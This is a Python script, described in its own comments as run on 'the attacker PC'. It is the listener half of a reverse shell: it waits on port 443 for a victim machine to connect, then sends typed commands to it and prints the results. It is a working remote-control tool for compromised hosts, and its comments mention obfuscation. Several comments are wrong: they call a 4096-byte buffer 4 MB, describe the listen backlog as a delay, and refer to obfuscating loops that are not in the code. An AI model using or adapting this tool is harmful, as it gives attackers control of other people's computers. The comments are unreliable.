#This script run in the attacker PC
import socket
import threading
import os
import sys


#we are defining a function send_commands this takes in a socket object. If the user input is “quit” we close the connection and exit . We encode the command and send it across the connection(conn.send). We receive the data and make it readable by converting it to a string with “utf-8”. We print the response and add (end=“\n”) to move the cursor to a new line so as to enter the next command.
def send_commands(conn):
    while True:
        print("enter the commands below\n")
        cmd = input()
        if cmd == 'quit':
            conn.close()
            server.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(4096), "utf-8") #reception buffer set to 4 MB; if the client's response is larger, it must be increased.
            print(client_response, end="\n")

#we are setting bind_ip and port for attacker to enter usually his own IP, port is set to 443(can be changed)
bind_ip = ''
bind_port = 443 
serv_add = (bind_ip , bind_port)

#we are creating a socket object, I have used TCP (socket.AF_INET,socket.SOCK_STREAM) then we are binding it to the server address, we listen for any connection with a time delay of 5 seconds.
#The cycle for are unnecessary; are used only to  obfuscate the code

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((serv_add))
server.listen(5)
        
print ("[*] listening on {}:{}".format(bind_ip,bind_port))

#after a successful connection we accept the connection using server.accept() this returns client IP(addr[0]), port(addr[1]) and a new connected socket(conn). We print out the details and ask for commands to be executed.
conn,addr = server.accept()
    
print('accepted connection from {} and port {}'.format(addr[0],addr[1]))

send_commands(conn)

conn.close()